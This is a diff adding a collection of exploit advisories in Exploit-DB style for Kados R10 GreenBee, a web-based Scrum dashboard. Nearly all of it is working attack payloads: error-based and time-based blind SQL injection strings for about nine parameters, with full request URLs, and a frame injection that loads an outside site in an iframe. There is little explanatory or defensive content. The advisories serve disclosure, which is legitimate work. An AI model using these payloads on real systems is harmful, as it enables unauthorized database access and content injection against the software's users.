@@ -1,0 +1,238 @@
+===========================================================================================
+# Exploit Title: Kados R10 GreenBee - 'menu_lev1' SQL Injection
+# Dork: N/A
+# Date: 06-03-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: https://www.kados.info/
+# Software Link: https://sourceforge.net/projects/kados/
+# Version: R10 GreenBee
+# Category: Webapps
+# Tested on: Wamp64, Windows
+# CVE: N/A
+# Software Description: KADOS (KAnban Dashboard for Online Scrum) is a
+web-based tool for managing Scrum projects.
+===========================================================================================
+# POC - SQLi
+# Parameters : menu_lev1
+# Attack Pattern :
+-1%27%2b(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a)%2b%27
+# GET Method :
+http://localhost/kados_r10/kados/projects.php?menu_lev1=-1'+(SELECT 1 and
+ROW(1,1)>(SELECT
+COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x
+FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)+'
+#
+http://localhost/kados_r10/kados/administration/languages.php?menu_lev1=%27[SQL
+Inject Here]
+# http://localhost/kados_r10/kados/administration/news.php?menu_lev1=%27[SQL
+Inject Here]
+#
+http://localhost/kados_r10/kados/administration/parameters.php?menu_lev1=%27[SQL
+Inject Here]
+#
+http://localhost/kados_r10/kados/administration/profiles.php?menu_lev1=%27[SQL
+Inject Here]
+#
+http://localhost/kados_r10/kados/administration/users.php?menu_lev1=%27[SQL
+Inject Here]
+#
+http://localhost/kados_r10/kados/app_admin/app_columns.php?menu_lev1=%27[SQL
+Inject Here]
+#
+http://localhost/kados_r10/kados/app_admin/external_connections.php?menu_lev1=%27[SQL
+Inject Here]
+#
+http://localhost/kados_r10/kados/app_admin/template_tags.php?menu_lev1=%27[SQL
+Inject Here]
+#
+http://localhost/kados_r10/kados/app_admin/template_tags_groups.php?menu_lev1=%27[SQL
+Inject Here]
+#
+http://localhost/kados_r10/kados/app_admin/templates_project.php?menu_lev1=%27[SQL
+Inject Here]
+# http://localhost/kados_r10/kados/my_profile.php?menu_lev1=%27[SQL Inject
+Here]
+# http://localhost/kados_r10/kados/my_profile_password.php?menu_lev1=%27[SQL
+Inject Here]
+# http://localhost/kados_r10/kados/template_checklist.php?menu_lev1=%27[SQL
+Inject Here]
+===========================================================================================
+
+===========================================================================================
+# Exploit Title: Kados R10 GreenBee - 'mng_profile_id' SQL Injection
+# Dork: N/A
+# Date: 06-03-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: https://www.kados.info/
+# Software Link: https://sourceforge.net/projects/kados/
+# Version: R10 GreenBee
+# Category: Webapps
+# Tested on: Wamp64, Windows
+# CVE: N/A
+# Software Description: KADOS (KAnban Dashboard for Online Scrum) is a web-based tool for managing Scrum projects.
+===========================================================================================
+# POC - SQLi
+# Parameters : mng_profile_id 
+# Attack Pattern : -1+or+1%3d1+and+(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a) 
+# GET Method : http://localhost/kados_r10/kados/administration/profiles.php?token=f6bd48af7b7230313ff1c00474381dcf&mng_profile_id=-1 or 1=1 and (SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a) 
+===========================================================================================
+
+
+===========================================================================================
+# Exploit Title: Kados R10 GreenBee - 'id_to_modify' SQL Injection
+# Dork: N/A
+# Date: 06-03-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: https://www.kados.info/
+# Software Link: https://sourceforge.net/projects/kados/
+# Version: R10 GreenBee
+# Category: Webapps
+# Tested on: Wamp64, Windows
+# CVE: N/A
+# Software Description: KADOS (KAnban Dashboard for Online Scrum) is a web-based tool for managing Scrum projects.
+===========================================================================================
+# POC - SQLi
+# Parameters : id_to_modify 
+# Attack Pattern : -1%27+and+6%3d3+or+1%3d1%2b(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a)%2b%27
+# GET Method : http://localhost/kados_r10/kados/administration/parameters.php?token=820c757c14e567fdef13d55877a19e39&action=modify&id_to_modify=-1' and 6=3 or 1=1+(SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)+'  
+# GET Method : http://localhost/kados_r10/kados/administration/news.php?token=a81c2106be9d9ef8cbc56622d87efac3&action=modify&id_to_modify=-1 or 1=1 and (SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)  
+===========================================================================================
+
+
+===========================================================================================
+# Exploit Title: Kados R10 GreenBee - 'user2reset' SQL Injection
+# Dork: N/A
+# Date: 06-03-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: https://www.kados.info/
+# Software Link: https://sourceforge.net/projects/kados/
+# Version: R10 GreenBee
+# Category: Webapps
+# Tested on: Wamp64, Windows
+# CVE: N/A
+# Software Description: KADOS (KAnban Dashboard for Online Scrum) is a web-based tool for managing Scrum projects.
+===========================================================================================
+# POC - SQLi (Blind)
+# Parameters : user2reset 
+# Attack Pattern : -1%27+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(25))A))%2b%27 
+# GET Method : http://localhost/kados_r10/kados/administration/users.php?token=01855ea7701da0f7e2a100088ea9c6c9&action=reset_password&user2reset=-1' or 1=((SELECT 1 FROM (SELECT SLEEP(25))A))+'   
+===========================================================================================
+
+
+===========================================================================================
+# Exploit Title: Kados R10 GreenBee - 'language_tag' SQL Injection
+# Dork: N/A
+# Date: 06-03-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: https://www.kados.info/
+# Software Link: https://sourceforge.net/projects/kados/
+# Version: R10 GreenBee
+# Category: Webapps
+# Tested on: Wamp64, Windows
+# CVE: N/A
+# Software Description: KADOS (KAnban Dashboard for Online Scrum) is a web-based tool for managing Scrum projects.
+===========================================================================================
+# POC - SQLi (Blind)
+# Parameters : language_tag  
+# Attack Pattern : %27%2b((SELECT+1+FROM+(SELECT+SLEEP(25))A))%2b%27 
+# GET Method : http://localhost/kados_r10/kados/administration/languages.php?token=f581575657b2e6a2660689998dd8306b&action=change_language_status&language_tag='+((SELECT 1 FROM (SELECT SLEEP(25))A))+'&situation=3    
+===========================================================================================
+
+
+===========================================================================================
+# Exploit Title: Kados R10 GreenBee - 'id_to_delete' SQL Injection
+# Dork: N/A
+# Date: 06-03-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: https://www.kados.info/
+# Software Link: https://sourceforge.net/projects/kados/
+# Version: R10 GreenBee
+# Category: Webapps
+# Tested on: Wamp64, Windows
+# CVE: N/A
+# Software Description: KADOS (KAnban Dashboard for Online Scrum) is a web-based tool for managing Scrum projects.
+===========================================================================================
+# POC - SQLi (Blind)
+# Parameters : id_to_delete  
+# Attack Pattern : 2+%2b+((SELECT+1+FROM+(SELECT+SLEEP(25))A))%2f*%27XOR(((SELECT+1+FROM+(SELECT+SLEEP(25))A)))OR%27%7c%22XOR(((SELECT+1+FROM+(SELECT+SLEEP(25))A)))OR%22*%2f 
+# GET Method : http://localhost/kados_r10/kados/administration/news.php?token=fad12fb6be860d0f53ecb25d2a6e4334&action=delete&id_to_delete=2 + ((SELECT 1 FROM (SELECT SLEEP(25))A))/*'XOR(((SELECT 1 FROM (SELECT SLEEP(25))A)))OR'|"XOR(((SELECT 1 FROM (SELECT SLEEP(25))A)))OR"*/  
+===========================================================================================
+
+
+===========================================================================================
+# Exploit Title: Kados R10 GreenBee - 'sort_direction' SQL Injection
+# Dork: N/A
+# Date: 06-03-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: https://www.kados.info/
+# Software Link: https://sourceforge.net/projects/kados/
+# Version: R10 GreenBee
+# Category: Webapps
+# Tested on: Wamp64, Windows
+# CVE: N/A
+# Software Description: KADOS (KAnban Dashboard for Online Scrum) is a web-based tool for managing Scrum projects.
+===========================================================================================
+# POC - SQLi (Blind)
+# Parameters : sort_direction
+# Attack Pattern : -1+AND+((SELECT+1+FROM+(SELECT+2)a+WHERE+1%3dsleep(25)))--+1
+# GET Method : http://localhost/kados_r10/kados/app_admin/app_columns.php?token=82ef5f1ad5effa486a0ca1471cbb18b5&sort_direction=-1 AND ((SELECT 1 FROM (SELECT 2)a WHERE 1=sleep(25)))-- 1&sort_criterion=column_tag
+===========================================================================================
+
+
+===========================================================================================
+# Exploit Title: Kados R10 GreenBee - 'id_project' SQL Injection
+# Dork: N/A
+# Date: 06-03-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: https://www.kados.info/
+# Software Link: https://sourceforge.net/projects/kados/
+# Version: R10 GreenBee
+# Category: Webapps
+# Tested on: Wamp64, Windows
+# CVE: N/A
+# Software Description: KADOS (KAnban Dashboard for Online Scrum) is a web-based tool for managing Scrum projects.
+===========================================================================================
+# POC - SQLi (Blind)
+# Parameters : id_project
+# Attack Pattern : 1+%2b+((SELECT+1+FROM+(SELECT+SLEEP(25))A))%2f*%27XOR(((SELECT+1+FROM+(SELECT+SLEEP(25))A)))OR%27%7c%22XOR(((SELECT+1+FROM+(SELECT+SLEEP(25))A)))OR%22*%2f
+# GET Method : http://localhost/kados_r10/kados/projects.php?token=56d0e371e763236c86ae7d3ede6a0626&action=choose_color&color=beige&id_project=1 + ((SELECT 1 FROM (SELECT SLEEP(25))A))/*'XOR(((SELECT 1 FROM (SELECT SLEEP(25))A)))OR'|"XOR(((SELECT 1 FROM (SELECT SLEEP(25))A)))OR"*/ 
+===========================================================================================
+
+
+===========================================================================================
+# Exploit Title: Kados R10 GreenBee - 'filter_user_mail' SQL Injection
+# Dork: N/A
+# Date: 06-03-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: https://www.kados.info/
+# Software Link: https://sourceforge.net/projects/kados/
+# Version: R10 GreenBee
+# Category: Webapps
+# Tested on: Wamp64, Windows
+# CVE: N/A
+# Software Description: KADOS (KAnban Dashboard for Online Scrum) is a web-based tool for managing Scrum projects.
+===========================================================================================
+# POC - SQLi (Blind)
+# Parameters : filter_user_mail
+# Attack Pattern : 1+%2b+((SELECT+1+FROM+(SELECT+SLEEP(25))A))%2f*%27XOR(((SELECT+1+FROM+(SELECT+SLEEP(25))A)))OR%27%7c%22XOR(((SELECT+1+FROM+(SELECT+SLEEP(25))A)))OR%22*%2f
+# POST Method : http://localhost/kados_r10/kados/administration/users.php?token=9ae24f061d88384406beabc3f8746c08 
+===========================================================================================
+
+===========================================================================================
+# Exploit Title: Kados R10 GreenBee - 'id_to_modify' Frame Injection
+# Dork: N/A
+# Date: 06-03-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: https://www.kados.info/
+# Software Link: https://sourceforge.net/projects/kados/
+# Version: R10 GreenBee
+# Category: Webapps
+# Tested on: Wamp64, Windows
+# CVE: N/A
+# Software Description: KADOS (KAnban Dashboard for Online Scrum) is a web-based tool for managing Scrum projects.
+===========================================================================================
+# POC - Frame Injection
+# Parameters : id_to_modify
+# Attack Pattern : %3ciframe+src%3d%22http%3a%2f%2fcyber-warrior.org%2f%3f%22%3e%3c%2fiframe%3e
+# GET Method : http://localhost/kados_r10/kados/administration/news.php?token=6f64f03ffee440e873d80ce1e584e51b&action=modify&id_to_modify=<iframe src="http://cyber-warrior.org/?"></iframe> 
+===========================================================================================
